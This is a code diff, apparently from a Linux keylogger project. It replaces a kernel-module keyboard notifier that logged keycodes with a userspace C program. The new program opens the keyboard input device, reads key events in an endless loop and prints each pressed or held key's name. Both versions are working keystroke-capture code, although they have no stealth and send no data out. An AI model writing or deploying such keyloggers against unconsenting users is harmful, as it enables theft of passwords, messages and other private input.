@@ -1,35 +1,54 @@
-#include <linux/module.h>	
-#include <linux/kernel.h>	
-#include <linux/keyboard.h>
+#include "logger.h"
+#include "key_names.h"
 
-MODULE_LICENSE("GPL");
-
-int logger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
+void keylogger ()
 {
-    struct keyboard_notifier_param  *param = _param;
-
-    if(code == KBD_KEYCODE)
+    int keyboard = 0;
+    int count = 0;
+    int event_size = sizeof(struct input_event);
+    int bytes_read = 0;
+    struct input_event event[64];
+    struct parse_key *key = NULL;
+    
+    // Open the keyboard input device for listening
+    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
+    if (keyboard == -1)
     {
-        printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+        fprintf(stderr, "Unable to open keyboard");
+        exit(EXIT_FAILURE);
     }
 
-    return NOTIFY_OK;
+    // Start logging the keys
+    while (1)
+    {
+        // Read a keypress
+        bytes_read = read(keyboard, event, event_size * 64);
+        // Loop through the generated events
+        for (count = 0; count < (bytes_read / event_size); count++)
+        {
+            if (EV_KEY == event[count].type)
+            {
+                if ((event[count].value == KEY_PRESS) || (event[count].value == KEY_HELD))
+                {
+                    // Find the correct name of the keypress. This is O(n) :-(
+                    for (key = key_names; key->name != NULL; key++)
+                    {
+                        if (key->value == (unsigned) event[count].code)
+                        {
+                            fprintf(stderr, "%s", key->name);
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 
-static struct notifier_block nb = {
-    .notifier_call = logger_notify,
-};
-
-static int logger_init(void)
+int main (int argc, char* argv[])
 {
-    register_keyboard_notifier(&nb);
+    keylogger();
+
     return 0;
 }
 
-static void logger_release(void)
-{
-    unregister_keyboard_notifier(&nb);
-}
 
-module_init(logger_init);
-module_exit(logger_release);
